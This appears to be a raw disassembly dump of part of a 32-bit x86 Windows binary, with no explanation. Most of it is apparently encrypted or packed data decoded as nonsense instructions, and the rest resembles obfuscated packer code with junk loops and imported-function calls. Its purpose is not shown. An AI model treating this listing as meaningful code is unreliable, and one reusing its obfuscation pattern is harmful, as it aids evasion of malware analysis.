  40997b:	sub    ah,BYTE PTR [ebp-0x7]
  40997e:	mov    ds:0x9b9b8b92,eax
  409983:	jmp    0x409943
  409985:	sti    
  409986:	rol    DWORD PTR es:[edx],cl
  409989:	mov    eax,0x93828ecf
  40998e:	inc    ebx
  40998f:	push   cs
  409990:	jmp    0x6728:0x45ff5ee
  409997:	xchg   ecx,eax
  409998:	mov    ebx,0xe22cac94
  40999d:	pop    ecx
  40999e:	mov    esp,0x7b51a0b6
  4099a3:	mov    ch,0x99
  4099a5:	ins    DWORD PTR es:[edi],dx
  4099a6:	and    DWORD PTR [ebp-0x56c42b6e],esp
  4099ac:	stc    
  4099ad:	push   0x6603d2b5
  4099b2:	jno    0x190f4c96
  4099b8:	lods   eax,DWORD PTR ds:[esi]
  4099b9:	sbb    DWORD PTR [esi-0x2f200390],esi
  4099bf:	bound  esp,QWORD PTR [ebp-0x3e]
  4099c2:	and    BYTE PTR [edi+0x158951dc],bh
  4099c8:	jne    0x409972
  4099ca:	inc    edx
  4099cb:	add    BYTE PTR [ecx-0x48],dl
  4099ce:	lahf   
  4099cf:	cld    
  4099d0:	mov    ds:0x8505c705,eax
  4099d5:	test   al,0x42
  4099d7:	add    bl,bh
  4099d9:	dec    ecx
  4099da:	add    BYTE PTR [eax],al
  4099dc:	mov    DWORD PTR [ebp-0x4],eax
  4099df:	mov    DWORD PTR ds:0x42a875,edi
  4099e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4099e8:	mov    DWORD PTR ds:0x42a7f9,0x12dd
  4099f2:	mov    DWORD PTR [ebp-0x8],0x4f35
  4099f9:	cmp    ecx,eax
  4099fb:	jne    0x40a060
  409a01:	xor    ecx,DWORD PTR ds:0x42a779
  409a07:	jmp    0x409cfa
  409a0c:	(bad)  
  409a0d:	retf   
  409a0e:	rcl    dh,1
  409a10:	xlat   BYTE PTR ds:[ebx]
  409a11:	fxch   st(2)
  409a13:	fst    DWORD PTR [ecx+0x7bec14cf]
  409a19:	or     BYTE PTR ds:0x78f7b60f,0x78
  409a20:	push   edx
  409a21:	jle    0x409a9b
  409a23:	js     0x409a45
  409a25:	scas   al,BYTE PTR es:[edi]
  409a26:	clc    
  409a27:	inc    edx
  409a28:	dec    ebx
  409a29:	xor    al,0x15
  409a2b:	add    BYTE PTR [esi],bh
  409a2d:	ins    BYTE PTR es:[edi],dx
  409a2e:	cmp    DWORD PTR [ebp+eax*2-0x7e25e091],edi
  409a35:	cwde   
  409a36:	fistp  QWORD PTR [edx-0x6d]
  409a39:	or     DWORD PTR [edi+0x56],0xffffffe3
  409a3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a3e:	stc    
  409a3f:	cdq    
  409a40:	adc    BYTE PTR [eax+0x6f],0x70
  409a44:	push   cs
  409a45:	cld    
  409a46:	pusha  
  409a47:	sub    ebp,DWORD PTR [edi+0x2]
  409a4a:	pop    ebx
  409a4b:	dec    eax
  409a4c:	in     eax,0x6c
  409a4e:	cmp    eax,0x664515cf
  409a53:	mov    ecx,DWORD PTR [eax]
  409a55:	mov    bh,0xe1
  409a57:	into   
  409a58:	and    al,0x13
  409a5a:	imul   edx,DWORD PTR [esi-0xe],0x2f607acc
  409a61:	pop    esi
  409a62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a63:	out    0x80,al
  409a65:	pop    edx
  409a66:	jbe    0x409a11
  409a68:	mov    esp,edx
  409a6a:	jne    0x409abd
  409a6c:	cmp    ebp,eax
  409a6e:	xchg   edi,eax
  409a6f:	sbb    dl,0x74
  409a72:	fnstcw WORD PTR [ebx]
  409a74:	sbb    edi,eax
  409a76:	dec    eax
  409a77:	jecxz  0x409a9b
  409a79:	sbb    dl,BYTE PTR ds:0x16c8e87d
  409a7f:	add    eax,0xc3fe1943
  409a84:	js     0x409ad7
  409a86:	push   esi
  409a87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a88:	xlat   BYTE PTR ds:[ebx]
  409a89:	mov    ds:0xc0cf6986,eax
  409a8e:	or     edi,esp
  409a90:	jp     0x409a93
  409a92:	mov    ecx,0x8bb00c51
  409a97:	xlat   BYTE PTR ds:[ebx]
  409a98:	jo     0x409ad6
  409a9a:	xor    eax,0x5ed9603d
  409a9f:	jmp    0x8ea3:0xd8b72bbf
  409aa6:	loope  0x409a35
  409aa8:	xor    eax,0x65376fc3
  409aad:	xchg   BYTE PTR [edx+0xed84089],cl
  409ab3:	sbb    al,0xf7
  409ab5:	dec    esi
  409ab6:	xlat   BYTE PTR ds:[ebx]
  409ab7:	or     WORD PTR [edi+0x1e770ae0],bp
  409abe:	retf   0xbd2c
  409ac1:	ret    
  409ac2:	dec    edi
  409ac3:	xchg   BYTE PTR [ecx],ah
  409ac5:	fnstenv [esi]
  409ac7:	nop
  409ac8:	xchg   BYTE PTR [ebp+edi*2-0x74],al
  409acc:	inc    ebp
  409acd:	pop    ecx
  409ace:	(bad)  
  409acf:	fs lahf 
  409ad1:	dec    ecx
  409ad2:	or     al,0xa3
  409ad4:	std    
  409ad5:	hlt    
  409ad6:	push   0x7934ef2e
  409adb:	mov    eax,0x4d672466
  409ae0:	adc    DWORD PTR [ebp-0x5215b686],ecx
  409ae6:	jmp    0xea5ae68b
  409aeb:	sbb    ah,BYTE PTR [edx-0x7]
  409aee:	xchg   cl,al
  409af0:	fcmovne st,st(2)
  409af2:	out    dx,eax
  409af3:	stos   DWORD PTR es:[edi],eax
  409af4:	jg     0x409acf
  409af6:	and    DWORD PTR [eax-0x28],ebx
  409af9:	sbb    DWORD PTR [esi-0x1789d40a],ebp
  409aff:	dec    ecx
  409b00:	push   0xdf08bf73
  409b05:	rcr    edi,0xa8
  409b08:	or     cl,al
  409b0a:	jle    0x409b1f
  409b0c:	mov    ds:0xe25bb4ca,al
  409b11:	pusha  
  409b12:	cmp    bh,bh
  409b14:	sub    ebx,ecx
  409b16:	test   eax,0x795df907
  409b1b:	sbb    al,0x84
  409b1d:	retf   
  409b1e:	shr    bh,1
  409b20:	inc    ecx
  409b21:	icebp  
  409b22:	pushf  
  409b23:	mov    ebp,0x964ecd5d
  409b28:	sbb    DWORD PTR [edx-0x33],ecx
  409b2b:	mov    esi,0x9fa565a7
  409b30:	ja     0x409b54
  409b32:	adc    al,0x99
  409b34:	ins    DWORD PTR es:[edi],dx
  409b35:	sbb    DWORD PTR [esp+edi*8-0x4b6defaa],esi
  409b3c:	mov    ebp,0xcadca6bf
  409b41:	dec    eax
  409b42:	sar    DWORD PTR [edi],1
  409b44:	sbb    DWORD PTR [edx-0x43],ebp
  409b47:	js     0x409b8d
  409b49:	pop    ss
  409b4a:	scas   al,BYTE PTR es:[edi]
  409b4b:	and    al,0xcd
  409b4d:	mov    eax,0x8510762d
  409b52:	fadd   DWORD PTR [ecx-0x34358caa]
  409b58:	fidivr DWORD PTR [edi-0x6b]
  409b5b:	sbb    DWORD PTR [ebx+0x4688eb1e],0x21467409
  409b65:	sbb    al,0xba
  409b67:	jnp    0x409b54
  409b69:	mov    bh,0xfc
  409b6b:	repnz dec esp
  409b6d:	imul   edx,DWORD PTR [edx-0x44]
  409b71:	jp     0x409b57
  409b73:	push   ecx
  409b74:	les    ecx,FWORD PTR es:[esi+0x13cfe06b]
  409b7b:	popf   
  409b7c:	dec    esp
  409b7d:	aam    0x5
  409b7f:	add    ah,cl
  409b81:	shl    BYTE PTR ds:0x213ef5ac,1
  409b87:	ror    BYTE PTR [ebp+0x1327ae59],cl
  409b8d:	mov    dh,0x77
  409b8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b90:	retf   
  409b91:	sbb    al,0xf6
  409b93:	stos   BYTE PTR es:[edi],al
  409b94:	cdq    
  409b95:	push   0x17
  409b97:	jnp    0x409bf9
  409b99:	cmp    cl,BYTE PTR [ecx-0x3e]
  409b9c:	push   ss
  409b9d:	sbb    bh,bh
  409b9f:	lea    edx,[edx-0x26825215]
  409ba5:	test   al,0xbf
  409ba7:	inc    esp
  409ba8:	or     DWORD PTR [edx],0xc8e6712d
  409bae:	mov    DWORD PTR [ecx-0x6],ebp
  409bb1:	dec    ebx
  409bb2:	(bad)  
  409bb3:	mov    db5,eax
  409bb6:	pop    eax
  409bb7:	pushf  
  409bb8:	mov    cl,0xd6
  409bba:	ja     0x409bcc
  409bbc:	sub    BYTE PTR [eax],bl
  409bbe:	fisub  WORD PTR [ebx+0x6a]
  409bc1:	mov    esi,0x7c45cd23
  409bc6:	dec    ecx
  409bc7:	jge    0x409c34
  409bc9:	dec    edi
  409bca:	sahf   
  409bcb:	retf   0x7172
  409bce:	pusha  
  409bcf:	rol    DWORD PTR [edi-0x1cfd9e90],0x67
  409bd6:	dec    edi
  409bd7:	pop    edi
  409bd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bd9:	xchg   edx,eax
  409bda:	ja     0x409bc7
  409bdc:	lahf   
  409bdd:	or     al,0xe9
  409bdf:	aad    0xb0
  409be1:	dec    ecx
  409be2:	jmp    0xa956d14f
  409be7:	inc    edx
  409be8:	jnp    0x409c0e
  409bea:	pop    eax
  409beb:	or     DWORD PTR [ebx],esp
  409bed:	rcr    DWORD PTR [eax+edx*8+0x3be6a38b],0xde
  409bf5:	dec    eax
  409bf6:	jb     0x409bf4
  409bf8:	sbb    eax,0xde52912a
  409bfd:	mov    bl,0x36
  409bff:	retf   
  409c00:	fldenv [esi+0x6dcfc5dc]
  409c06:	cmc    
  409c07:	push   ebx
  409c08:	ins    BYTE PTR es:[edi],dx
  409c09:	pop    ebx
  409c0a:	dec    ebx
  409c0b:	xchg   esp,eax
  409c0c:	add    BYTE PTR [ecx+0xb],ch
  409c0f:	ret    0x6877
  409c12:	sbb    bl,0x3b
  409c15:	and    bh,dl
  409c17:	outs   dx,DWORD PTR ds:[esi]
  409c18:	stc    
  409c19:	pop    edi
  409c1a:	cmc    
  409c1b:	sub    DWORD PTR [eax+0x54],edx
  409c1e:	test   al,0xbd
  409c20:	mov    ah,0x8
  409c22:	hlt    
  409c23:	pop    edx
  409c24:	push   ebx
  409c25:	loope  0x409c33
  409c27:	adc    ecx,DWORD PTR [ebx+ebp*4+0x27]
  409c2b:	faddp  st(1),st
  409c2d:	int    0x85
  409c2f:	cmp    DWORD PTR [edx-0x214460d0],edx
  409c35:	stos   BYTE PTR es:[edi],al
  409c36:	inc    ebx
  409c37:	cmp    BYTE PTR [esi+ecx*1-0x31],0x33
  409c3c:	jae    0x409c28
  409c3e:	bound  edi,QWORD PTR [edx-0x1b8a3f3]
  409c44:	pextrw esi,mm2,0x64
  409c48:	xchg   ebp,eax
  409c49:	cwde   
  409c4a:	jb     0x409c46
  409c4c:	cs fwait
  409c4e:	push   edx
  409c4f:	sbb    eax,0x335d2779
  409c54:	jmp    0x8bace8dc
  409c59:	dec    eax
  409c5a:	push   ss
  409c5b:	pop    ecx
  409c5c:	frstor [ecx+eiz*4+0x40]
  409c60:	mov    dx,ax
  409c63:	inc    esi
  409c64:	sbb    BYTE PTR [ecx],bh
  409c66:	out    dx,al
  409c67:	sar    DWORD PTR [ebp-0x6d],1
  409c6a:	lds    edi,FWORD PTR [ebp+0x32]
  409c6d:	xchg   ebp,eax
  409c6e:	popf   
  409c6f:	sbb    dh,BYTE PTR [eax]
  409c71:	lods   al,BYTE PTR ds:[esi]
  409c72:	and    eax,esp
  409c74:	jg     0x409cb5
  409c76:	mov    bl,0x4
  409c78:	adc    al,0xc5
  409c7a:	in     eax,dx
  409c7b:	and    al,0x0
  409c7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c7e:	lds    esp,FWORD PTR [ebp-0x49]
  409c81:	(bad)  
  409c82:	sub    BYTE PTR [esi],cl
  409c84:	outs   dx,DWORD PTR ds:[esi]
  409c85:	dec    ebp
  409c86:	ror    esi,1
  409c88:	and    BYTE PTR [ebp-0x23921af6],0xa2
  409c8f:	das    
  409c90:	sti    
  409c91:	mov    ah,0x52
  409c93:	test   eax,0xa183e104
  409c98:	mov    ah,0xd3
  409c9a:	and    eax,0x5e54ab43
  409c9f:	xor    ecx,0xffffff96
  409ca2:	mov    DWORD PTR [esi-0x5d],ecx
  409ca5:	das    
  409ca6:	or     al,0xc1
  409ca8:	(bad)  
  409caa:	push   ecx
  409cab:	retf   0x7df8
  409cae:	mov    dh,0x3a
  409cb0:	(bad)  
  409cb1:	cmc    
  409cb2:	out    dx,eax
  409cb3:	stos   BYTE PTR es:[edi],al
  409cb4:	mov    ebx,0x4aa6dbf4
  409cb9:	mov    dx,0x5c94
  409cbd:	push   ebx
  409cbe:	pushf  
  409cbf:	jae    0x409c80
  409cc1:	cdq    
  409cc2:	out    0x3,al
  409cc4:	icebp  
  409cc5:	inc    esi
  409cc6:	xchg   ebx,eax
  409cc7:	mov    bl,0xec
  409cc9:	push   esi
  409cca:	or     eax,0x6dc5f017
  409ccf:	outs   dx,DWORD PTR ds:[esi]
  409cd0:	ins    DWORD PTR es:[edi],dx
  409cd1:	in     eax,0xa6
  409cd3:	fdivr  QWORD PTR [esi-0x69]
  409cd6:	pop    eax
  409cd7:	vpsrldq ymm3,ymm4,0x94
  409cdc:	cwde   
  409cdd:	adc    ecx,DWORD PTR [ecx+0x33]
  409ce0:	icebp  
  409ce1:	(bad)  
  409ce2:	rol    BYTE PTR [ebp-0x2d],0xdb
  409ce6:	sbb    eax,0x2e0d4d77
  409ceb:	retf   
  409cec:	rcl    DWORD PTR ds:0xa4dbbd3b,0x54
  409cf3:	push   eax
  409cf4:	sub    DWORD PTR ds:0xeb2c476e,0xf8458b66
  409cfe:	sbb    DWORD PTR ds:0x42a779,0x42a805
  409d08:	mov    ecx,0x8a36
  409d0d:	xor    ax,cx
  409d10:	and    ecx,0x5dd3
  409d16:	mov    ecx,0x3afc
  409d1b:	add    ax,cx
  409d1e:	neg    ecx
  409d20:	mov    ecx,DWORD PTR [ebp+0x8]
  409d23:	or     DWORD PTR ds:0x42a77d,0x299c
  409d2d:	movzx  eax,ax
  409d30:	sbb    DWORD PTR ds:0x42a841,0x42a83d
  409d3a:	not    eax
  409d3c:	xor    DWORD PTR ds:0x42a831,0x55d1
  409d46:	and    eax,DWORD PTR [ecx]
  409d48:	jmp    0x40a03b
  409d4d:	ret    
  409d4e:	int3   
  409d4f:	leave  
  409d50:	(bad)  
  409d51:	(bad)  
  409d53:	rcr    ecx,cl
  409d55:	sahf   
  409d56:	inc    edx
  409d57:	imul   edx,DWORD PTR [edi+0x2e49127a],0xffffff88
  409d5e:	hlt    
  409d5f:	js     0x409dd9
  409d61:	push   edx
  409d62:	jle    0x409ddc
  409d64:	js     0x409d78
  409d66:	daa    
  409d67:	lahf   
  409d68:	out    dx,al
  409d69:	mov    ecx,0xcb78d302
  409d6e:	add    edx,DWORD PTR [ecx]
  409d70:	scas   al,BYTE PTR es:[edi]
  409d71:	arpl   WORD PTR [ebx],ax
  409d73:	mov    dl,bl
  409d75:	pop    edi
  409d76:	mov    ds,WORD PTR ds:0xd7956703
  409d7c:	inc    esp
  409d7d:	lds    edi,FWORD PTR gs:[edi-0x28]
  409d81:	std    
  409d82:	cwde   
  409d83:	lods   al,BYTE PTR ds:[esi]
  409d84:	cmp    BYTE PTR [ecx+0x7e960d5a],al
  409d8a:	lods   eax,DWORD PTR ds:[esi]
  409d8b:	adc    eax,0xaca9b3b
  409d90:	mov    ebp,0xc31531ea
  409d95:	(bad)  
  409d96:	dec    ecx
  409d97:	test   al,0xf4
  409d99:	shl    ah,0xb1
  409d9c:	mov    edi,DWORD PTR [ecx-0x1d]
  409d9f:	mov    eax,ds:0xde24a652
  409da4:	inc    ebp
  409da5:	dec    edi
  409da6:	rcl    DWORD PTR ds:0xa57345b4,0xf1
  409dad:	cmp    al,0xff
  409daf:	out    dx,eax
  409db0:	mov    DWORD PTR fs:[bp+si+0x7633],edx
  409db6:	push   edi
  409db7:	push   eax
  409db8:	xor    eax,0xdc04cdf9
  409dbd:	jg     0x409d70
  409dbf:	jecxz  0x409e1f
  409dc1:	jl     0x409dfa
  409dc3:	jecxz  0x409e25
  409dc5:	push   ss
  409dc6:	push   0xffffffdc
  409dc8:	mul    ah
  409dca:	mov    edx,0xd5e54f15
  409dcf:	je     0x409dc0
  409dd1:	jo     0x409e30
  409dd3:	sub    eax,0xaebef1d
  409dd8:	aam    0x55
  409dda:	int3   
  409ddb:	adc    eax,0x5d48fbba
  409de0:	jne    0x409ddc
  409de2:	mov    esp,0xd9a1cd0e
  409de7:	dec    edi
  409de8:	aaa    
  409de9:	pop    ecx
  409dea:	ins    BYTE PTR es:[edi],dx
  409deb:	or     al,0xaa
  409ded:	mov    ?,WORD PTR [edi-0x8c18bf9]
  409df3:	add    ebp,DWORD PTR [edi+0x1a]
  409df6:	mov    cs,eax
  409df8:	imul   edi,DWORD PTR [edx-0x2c],0x9
  409dfc:	sub    ebp,edx
  409dfe:	loopne 0x409e19
  409e00:	mov    dh,0x5a
  409e02:	xor    BYTE PTR [ebx+0x26fdeecc],al
  409e08:	icebp  
  409e09:	fbld   TBYTE PTR [edx+0x58]
  409e0c:	or     BYTE PTR ds:0x6085ad13,bh
  409e12:	pop    ds
  409e13:	cmp    bl,dh
  409e15:	imul   DWORD PTR [ebx+ebx*1-0x5372d244]
  409e1c:	retf   
  409e1d:	sub    eax,0x3abe7884
  409e22:	sub    ecx,esp
  409e24:	adc    DWORD PTR [ebp+0x7ce02813],edi
  409e2a:	stos   DWORD PTR es:[edi],eax
  409e2b:	into   
  409e2c:	pusha  
  409e2d:	mov    al,ds:0x6e9bbca3
  409e32:	or     BYTE PTR [esi+0x7cc882a0],0x6f
  409e39:	sub    ebp,DWORD PTR [edi]
  409e3b:	pminub mm6,QWORD PTR [ecx+0xc]
  409e3f:	imul   ebp,DWORD PTR [esi-0x2592c438],0x7ec2a455
  409e49:	and    al,0x67
  409e4b:	cmovo  edi,DWORD PTR [eax]
  409e4e:	sbb    DWORD PTR [eax],edx
  409e50:	xchg   esp,eax
  409e51:	shr    ebx,cl
  409e53:	mov    esp,0xa2689358
  409e58:	cmc    
  409e59:	cdq    
  409e5a:	fsubr  DWORD PTR [ecx-0x42133c64]
  409e60:	dec    ecx
  409e61:	sbb    DWORD PTR [ecx-0x5fd8ad87],ebx
  409e67:	cwde   
  409e68:	pushf  
  409e69:	les    esi,FWORD PTR [edi+0x6c0ceebc]
  409e6f:	(bad)  
  409e70:	shl    BYTE PTR [eax-0x3f],0x43
  409e74:	jg     0x409ee4
  409e76:	inc    esi
  409e77:	retf   
  409e78:	sbb    eax,0x8afbde8e
  409e7d:	and    edx,DWORD PTR [esi+0x2d]
  409e80:	jne    0x409efe
  409e82:	or     BYTE PTR [edx+0x4f827333],ah
  409e88:	mov    ch,0x5f
  409e8a:	pop    esi
  409e8b:	bswap  ebp
  409e8d:	mov    esi,0x5fd5d0ba
  409e92:	adc    cl,bl
  409e94:	adc    BYTE PTR [ebx],bh
  409e96:	fs (bad) 
  409e98:	xchg   esi,eax
  409e99:	mov    edx,0x825d4134
  409e9e:	loope  0x409e8d
  409ea0:	xor    eax,0xb2098fdd
  409ea5:	xor    bl,dl
  409ea7:	jecxz  0x409ede
  409ea9:	mov    cl,BYTE PTR [ebp+0x50708a49]
  409eaf:	pop    edi
  409eb0:	mov    bh,0x26
  409eb2:	gs dec esp
  409eb4:	xor    BYTE PTR [eax-0x614946c9],0xdf
  409ebb:	fwait
  409ebc:	fs push cs
  409ebe:	pop    ds
  409ebf:	lods   al,BYTE PTR ds:[esi]
  409ec0:	pcmpeqd mm5,QWORD PTR [edx-0x74e38e26]
  409ec7:	daa    
  409ec8:	repnz pop ebp
  409eca:	es out 0x2c,eax
  409ecd:	ficom  DWORD PTR ds:0xb692b326
  409ed3:	jmp    0x28aeae3
  409ed8:	aas    
  409ed9:	jae    0x409f2f
  409edb:	push   edi
  409edc:	sub    ebx,DWORD PTR [esi+0x3f]
  409edf:	clc    
  409ee0:	fsubr  DWORD PTR [edx+0x9]
  409ee3:	mov    dl,0x67
  409ee5:	inc    ebx
  409ee6:	cmp    cl,BYTE PTR [ecx+0x54]
  409ee9:	sub    eax,0xd9966bf6
  409eee:	push   ss
  409eef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ef0:	lods   al,BYTE PTR ds:[esi]
  409ef1:	lock mov esi,0x9570d51e
  409ef7:	push   esp
  409ef8:	pushf  
  409ef9:	lods   eax,DWORD PTR ds:[esi]
  409efa:	in     eax,0xd1
  409efc:	cwde   
  409efd:	push   edi
  409efe:	je     0x409f7e
  409f00:	cmp    ecx,esp
  409f02:	mov    edi,0x4bc13622
  409f07:	inc    edi
  409f08:	call   FWORD PTR [ecx+edi*1]
  409f0b:	inc    ebx
  409f0c:	and    BYTE PTR [eax+0x536327bf],al
  409f12:	sti    
  409f13:	call   0xda1f4853
  409f18:	xchg   DWORD PTR [ebp-0x30],ebp
  409f1b:	pop    ebx
  409f1c:	cld    
  409f1d:	pushf  
  409f1e:	mov    bl,0x7c
  409f20:	mov    ah,0x7d
  409f22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f23:	jns    0x409ee1
  409f25:	and    esi,ecx
  409f27:	add    DWORD PTR [edi],esp
  409f29:	es jo  0x409f37
  409f2c:	popf   
  409f2d:	xchg   ebx,ebx
  409f2f:	mov    bh,0xd4
  409f31:	push   ss
  409f32:	fsubr  st(6),st
  409f34:	cmc    
  409f35:	add    eax,0xc2c029cf
  409f3a:	mov    BYTE PTR [edx+0xf],ch
  409f3d:	retf   
  409f3e:	mov    eax,0x8e8dccd2
  409f43:	push   ebp
  409f44:	leave  
  409f45:	cmp    eax,0xe67d6664
  409f4a:	jge    0x409ef8
  409f4c:	es mov ch,0xec
  409f50:	lods   al,BYTE PTR ds:[esi]
  409f51:	out    dx,al
  409f52:	les    ecx,FWORD PTR [esi+eiz*2]
  409f55:	add    esi,DWORD PTR [eax+0x65]
  409f58:	fidivr DWORD PTR [eax-0x72]
  409f5b:	lods   al,BYTE PTR ds:[esi]
  409f5c:	fucomi st,st(0)
  409f5e:	in     al,0x72
  409f60:	xor    al,0xa6
  409f62:	cwde   
  409f63:	loope  0x409fb8
  409f65:	out    0x48,al
  409f67:	and    al,0xb1
  409f69:	retf   0x2000
  409f6c:	nop
  409f6d:	loope  0x409f0d
  409f6f:	fbstp  TBYTE PTR [ecx]
  409f71:	inc    esi
  409f72:	pusha  
  409f73:	je     0x409f7a
  409f75:	into   
  409f76:	rcr    BYTE PTR [esi-0x57],0xf4
  409f7a:	add    DWORD PTR [eax+edx*2+0x70],edx
  409f7e:	ds pushf 
  409f80:	clc    
  409f81:	add    cl,bh
  409f83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f84:	bound  ebx,QWORD PTR [esi-0x78]
  409f87:	test   al,0x9f
  409f89:	dec    edi
  409f8a:	mov    esp,0x7860637d
  409f8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f90:	(bad)  
  409f91:	jno    0x409f6c
  409f93:	sbb    eax,0x829f9fc6
  409f98:	(bad)  
  409f9a:	ins    BYTE PTR es:[edi],dx
  409f9b:	pushf  
  409f9c:	xchg   esi,eax
  409f9d:	gs into 
  409f9f:	pop    edi
  409fa0:	inc    edi
  409fa1:	inc    ecx
  409fa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fa3:	mov    cl,0x52
  409fa5:	xor    eax,0x28c98a16
  409faa:	movups XMMWORD PTR [eax+ecx*8+0x50809687],xmm5
  409fb2:	xchg   edi,eax
  409fb3:	adc    ecx,edi
  409fb5:	rcl    BYTE PTR [eax+0x59],1
  409fb8:	popa   
  409fb9:	add    bl,BYTE PTR [esp+edx*1+0x29f2663c]
  409fc0:	aam    0xae
  409fc2:	sbb    al,0xa2
  409fc4:	ss stos DWORD PTR es:[edi],eax
  409fc6:	jle    0x409f70
  409fc8:	rol    cl,0x6e
  409fcb:	iret   
  409fcc:	or     eax,esp
  409fce:	jae    0x409feb
  409fd0:	or     al,0xa1
  409fd2:	rcr    DWORD PTR [ebx+0x2a72d752],cl
  409fd8:	mov    dh,BYTE PTR [eax]
  409fda:	mul    BYTE PTR [ecx+0x7]
  409fdd:	enter  0x4391,0x6
  409fe1:	mov    ebx,0xbaf00384
  409fe6:	sub    al,0x7b
  409fe8:	adc    DWORD PTR [ebx-0x3],0x32
  409fec:	sbb    BYTE PTR [esi],al
  409fee:	into   
  409fef:	fdivr  DWORD PTR [ebp-0x4a]
  409ff2:	mov    eax,0x64edf868
  409ff7:	adc    al,0x1c
  409ff9:	adc    al,0x39
  409ffb:	ret    0xe992
  409ffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fff:	sbb    bl,dh
  40a001:	adc    dh,BYTE PTR [edi]
  40a003:	scas   eax,DWORD PTR es:[edi]
  40a004:	push   edi
  40a005:	inc    ebx
  40a006:	sub    eax,0xa186f48
  40a00b:	and    ch,cl
  40a00d:	mov    bh,0xab
  40a00f:	and    al,dl
  40a011:	mov    cl,0x30
  40a013:	call   0x92cee733
  40a018:	push   ds
  40a019:	int3   
  40a01a:	repz mov ebp,0x1ec25fbc
  40a020:	arpl   WORD PTR [esi],cx
  40a022:	dec    esp
  40a023:	repz inc ebx
  40a025:	jb     0x40a050
  40a027:	loope  0x409ffd
  40a029:	mov    ah,0x92
  40a02b:	pop    edi
  40a02c:	out    0xba,eax
  40a02e:	aaa    
  40a02f:	pop    ss
  40a030:	jnp    0x40a065
  40a032:	jbe    0x40a014
  40a034:	mov    eax,ds:0xe05721ef
  40a039:	or     ch,BYTE PTR [ecx-0x76f7b275]
  40a03f:	add    ecx,ebp
  40a041:	pop    es
  40a042:	add    BYTE PTR [eax],al
  40a044:	add    BYTE PTR [ecx-0x6140038b],al
  40a04a:	adc    al,0xe
  40a04c:	mov    ax,WORD PTR [ebp-0x8]
  40a050:	push   DWORD PTR [ebp+0x8]
  40a053:	call   0x40a064
  40a058:	test   eax,eax
  40a05a:	je     0x40a045
  40a060:	leave  
  40a061:	ret    0x4
  40a064:	push   ebp
  40a065:	mov    ebp,esp
  40a067:	sub    esp,0x2c
  40a06a:	and    DWORD PTR ds:0x42a765,0x0
  40a074:	jmp    0x40a084
  40a079:	mov    eax,ds:0x42a765
  40a07e:	inc    eax
  40a07f:	mov    ds:0x42a765,eax
  40a084:	cmp    DWORD PTR ds:0x42a765,0x12
  40a08b:	jae    0x40a110
  40a091:	cmp    DWORD PTR ds:0x42a765,0x22
  40a098:	jne    0x40a0b2
  40a09e:	push   DWORD PTR [ebp-0x14]
  40a0a1:	push   0x6f60
  40a0a6:	push   DWORD PTR [ebp-0x24]
  40a0a9:	push   DWORD PTR [ebp-0x10]
  40a0ac:	call   DWORD PTR ds:0x41d198
  40a0b2:	jmp    0x40a079
  40a0b7:	and    DWORD PTR ds:0x42a871,0x0
  40a0c1:	jmp    0x40a0d1
  40a0c6:	mov    eax,ds:0x42a871
  40a0cb:	inc    eax
  40a0cc:	mov    ds:0x42a871,eax
  40a0d1:	cmp    DWORD PTR ds:0x42a871,0x11
  40a0d8:	jae    0x40a110
  40a0de:	cmp    DWORD PTR ds:0x42a871,0x1e
  40a0e5:	jne    0x40a0fb
  40a0eb:	push   0x89ca
  40a0f0:	push   0x6edd
  40a0f5:	call   DWORD PTR ds:0x41d244
  40a0fb:	jmp    0x40a0c6
  40a100:	mov    ecx,DWORD PTR ds:0x42a78d
  40a106:	mov    eax,ds:0x42a869
  40a10b:	sub    eax,ecx
  40a10d:	xor    ecx,DWORD PTR [ecx+eax*1]
  40a110:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  40a117:	mov    ecx,DWORD PTR ds:0x42a855
  40a11d:	xor    eax,eax
  40a11f:	or     eax,DWORD PTR ds:0x42a891
  40a125:	sub    ecx,eax
  40a127:	imul   ecx,DWORD PTR [ecx+eax*1]
  40a12b:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40a132:	and    DWORD PTR ds:0x42a761,0x0
  40a13c:	jmp    0x40a14e
  40a141:	mov    ecx,DWORD PTR ds:0x42a761
  40a147:	inc    ecx
  40a148:	mov    DWORD PTR ds:0x42a761,ecx
  40a14e:	cmp    DWORD PTR ds:0x42a761,0x1d
  40a155:	jae    0x40a192
  40a15b:	cmp    DWORD PTR ds:0x42a761,0xb
  40a162:	jne    0x40a173
  40a168:	push   0x3d1a
  40a16d:	call   DWORD PTR ds:0x41d19c
  40a173:	cmp    DWORD PTR ds:0x42a761,0xa
  40a17a:	jne    0x40a18d
  40a180:	mov    ecx,DWORD PTR ds:0x42a761
  40a186:	inc    ecx
  40a187:	mov    DWORD PTR ds:0x42a761,ecx
  40a18d:	jmp    0x40a141
  40a192:	mov    eax,0x9567
  40a197:	mov    WORD PTR [ebp-0x4],ax
  40a19b:	add    DWORD PTR ds:0x42a7bd,ecx
  40a1a1:	jmp    0x40a4ba
  40a1a6:	cmp    al,0xc8
  40a1a8:	ret    0xd2d2
  40a1ab:	ror    ah,cl
  40a1ad:	into   
  40a1ae:	jge    0x40a22b
  40a1b0:	enter  0x460,0x50
  40a1b4:	adc    ch,BYTE PTR [ebx]
  40a1b6:	loop   0x40a1b1
  40a1b8:	js     0x40a232
  40a1ba:	je     0x40a23a
  40a1bc:	js     0x40a236
  40a1be:	call   0x978b:0xd9b40231
  40a1c5:	pop    ebx
  40a1c6:	les    edi,FWORD PTR [ebp-0x54]
  40a1c9:	clc    
  40a1ca:	sub    ch,ch
  40a1cc:	xor    ch,BYTE PTR [edi+0x53]
  40a1cf:	in     al,0x7a
  40a1d1:	jmp    0x2c2a:0xb32649ca
  40a1d8:	sbb    dh,BYTE PTR [edx+0x4a]
